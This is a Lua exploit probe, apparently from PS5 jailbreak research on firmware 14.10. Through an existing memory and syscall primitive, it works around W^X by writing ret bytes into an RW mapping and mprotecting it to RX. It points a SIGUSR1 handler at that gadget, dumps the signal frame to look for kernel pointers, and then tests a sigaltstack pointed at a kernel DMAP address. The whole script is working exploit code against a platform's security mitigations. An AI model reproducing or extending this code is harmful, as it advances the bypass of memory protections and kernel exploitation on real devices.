-- 14.10 Recon Probe 26c: W^X-safe ret gadget
-- PS5 enforces W^X: RWX mmap gives RW, executing crashes
-- Strategy: mmap RW, write 0xC3, mprotect to RX
-- Also try: find existing ret in executable memory by probing
-- handler addresses near crash handler (0x533118f4)

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: W^X GADGET ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_mmap = 477,
    sc_mprotect = 74,
    sc_munmap = 73,
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
})

local PROT_READ = 1
local PROT_WRITE = 2
local PROT_EXEC = 4
local MAP_PRIVATE = 2
local MAP_ANON = 0x1000
local SA_SIZE = 64
local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(32)
local ss_old = memory.alloc(32)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: mmap RW → write ret → mprotect RX
-- ============================================================
log("")
log("--- PART 1: RW mmap + mprotect RX ---")

local rw_ok, rw_ptr = pcall(function()
    return syscall.sc_mmap(0, 4096, PROT_READ + PROT_WRITE,
        MAP_PRIVATE + MAP_ANON, -1, 0)
end)

local gadget_addr = nil

if rw_ok then
    local addr = rw_ptr:tonumber()
    log(string.format("  RW mmap: 0x%x", addr))

    if addr > 0 and addr < 0xFFFFFFFF00000000 then
        -- Write ret + nop sled for safety
        memory.write_byte(rw_ptr, 0xC3) -- ret
        memory.write_byte(rw_ptr + 1, 0xC3)
        memory.write_byte(rw_ptr + 2, 0xC3)
        memory.write_byte(rw_ptr + 3, 0xC3)

        -- mprotect to RX (drop write, add exec)
        local mp_ok, mp_ret = pcall(function()
            return syscall.sc_mprotect(rw_ptr, 4096, PROT_READ + PROT_EXEC)
        end)
        local mp_rv = mp_ok and mp_ret:tonumber() or -999
        log("  mprotect(RX): rv=" .. mp_rv)

        if mp_rv == 0 then
            -- Verify we can still read (page is R)
            local rd_ok, rd_val = pcall(function()
                return memory.read_byte(rw_ptr):tonumber()
            end)
            log("  read after mprotect: " ..
                (rd_ok and string.format("0x%02x", rd_val) or "FAIL"))
            if rd_ok and rd_val == 0xC3 then
                gadget_addr = rw_ptr
                log("  *** RX gadget ready ***")
            end
        else
            -- mprotect to RX failed, try just PROT_EXEC
            local mp2_ok, mp2_ret = pcall(function()
                return syscall.sc_mprotect(rw_ptr, 4096, PROT_EXEC)
            end)
            log("  mprotect(X only): rv=" ..
                (mp2_ok and tostring(mp2_ret:tonumber()) or "ERR"))

            -- Try RWX (maybe the kernel allows it with mprotect?)
            local mp3_ok, mp3_ret = pcall(function()
                return syscall.sc_mprotect(rw_ptr, 4096,
                    PROT_READ + PROT_WRITE + PROT_EXEC)
            end)
            log("  mprotect(RWX): rv=" ..
                (mp3_ok and tostring(mp3_ret:tonumber()) or "ERR"))
        end
    end
end

-- ============================================================
-- PART 2: Alternative — try mmap with only RX from start
-- then see if we can somehow write to it
-- ============================================================
log("")
log("--- PART 2: mmap RX directly ---")

local rx_ok, rx_ptr = pcall(function()
    return syscall.sc_mmap(0, 4096, PROT_READ + PROT_EXEC,
        MAP_PRIVATE + MAP_ANON, -1, 0)
end)
if rx_ok then
    local rx_addr = rx_ptr:tonumber()
    log(string.format("  RX mmap: 0x%x", rx_addr))

    -- Check what's at offset 0 (uninitialized anon page = zeros)
    local rd_ok, rd_val = pcall(function()
        return memory.read_byte(rx_ptr):tonumber()
    end)
    log("  byte[0]: " .. (rd_ok and string.format("0x%02x", rd_val) or "FAIL"))

    -- 0x00 0x00 = ADD [RAX], AL — will likely crash
    -- But if page is zero-filled and executable, any 0xC3 at known
    -- offset in the page would work. Unfortunately we can't write.
end

-- ============================================================
-- PART 3: Try using the crash handler itself as a signal handler
-- but for a different signal, and see what sigframe looks like
-- The crash handler handles SIGILL(4), SIGBUS(10), SIGSEGV(11)
-- For SIGUSR1(30) it might behave differently
-- Actually probe 24 showed it DOES run for SIGUSR1 and corrupts Lua
--
-- Better approach: try offsets from crash handler as handler
-- If crash handler is at start of function, then (handler + N)
-- where N skips to near the end might hit a ret
-- Try small set of offsets without reading memory
-- ============================================================
log("")
log("--- PART 3: probe crash handler offsets ---")

-- The crash handler likely has a function epilogue somewhere
-- Typical sizes: small handler = 50-200 bytes
-- We'll try handler + offset as the signal handler address
-- Use SIGUSR1 with SIG_IGN first to set up altstack safely

local STACK_SZ = 32768
local test_stack = memory.alloc(STACK_SZ)

-- Set user altstack
memory.write_qword(ss_new, test_stack)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- We'll test if the mprotect gadget works first
if gadget_addr then
    log("  testing mprotect RX gadget...")
    for i = 0, STACK_SZ - 4, 4 do
        memory.write_dword(test_stack + i, 0x55550000 + i)
    end

    for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
    memory.write_qword(sa_new, gadget_addr)
    memory.write_dword(sa_new + 8, 0x0001 + 0x0040)
    pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

    log("  sending SIGUSR1 to ret gadget...")
    local k_ok, k_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
    log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

    local alive = pcall(function() return syscall.sc_getpid() end)
    log("  alive: " .. tostring(alive))

    if alive then
        local modified = 0
        local first_mod = -1
        for i = 0, STACK_SZ - 4, 4 do
            local v = memory.read_dword(test_stack + i):tonumber()
            if v ~= 0x55550000 + i then
                modified = modified + 1
                if first_mod < 0 then first_mod = i end
            end
        end
        log("  altstack modified: " .. modified .. " dwords")
        if first_mod >= 0 then
            log("  *** SIGNAL FRAME ON ALTSTACK ***")
            log(string.format("  first mod at +%d", first_mod))
            for i = first_mod, math.min(first_mod + 256, STACK_SZ - 8), 8 do
                local lo = memory.read_dword(test_stack + i):tonumber()
                local hi = memory.read_dword(test_stack + i + 4):tonumber()
                if hi ~= 0x55550000 + i + 4 or lo ~= 0x55550000 + i then
                    local tag = ""
                    if hi >= 0xFFFF0000 then tag = " ***KPTR***" end
                    log(string.format("    +%04x: 0x%08x%08x%s", i, hi, lo, tag))
                end
            end

            -- ==============================================
            -- PART 4: KERNEL ALTSTACK + RET GADGET
            -- ==============================================
            log("")
            log("--- PART 4: KERNEL ALTSTACK ---")

            memory.write_dword(ss_new + 16, 4)
            pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

            memory.write_dword(ss_new, 0x10000000)
            memory.write_dword(ss_new + 4, 0xFFFFF800)
            memory.write_qword(ss_new + 8, STACK_SZ)
            memory.write_dword(ss_new + 16, 0)
            local kss = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
            log("  set kernel DMAP altstack: " .. tostring(kss))

            log("  sending SIGUSR1 to kernel altstack...")
            local k2_ok, k2_ret = pcall(function()
                return syscall.sc_kill(pid, 30)
            end)
            log("  kill rv=" .. (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

            local alive2 = pcall(function() return syscall.sc_getpid() end)
            log("  alive: " .. tostring(alive2))

            memory.write_dword(ss_new + 16, 4)
            pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
        end
    end
else
    log("  no gadget available, skipping handler test")
end

-- Cleanup
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
memory.write_dword(ss_new + 16, 4)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

log("")
log("=== W^X GADGET DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
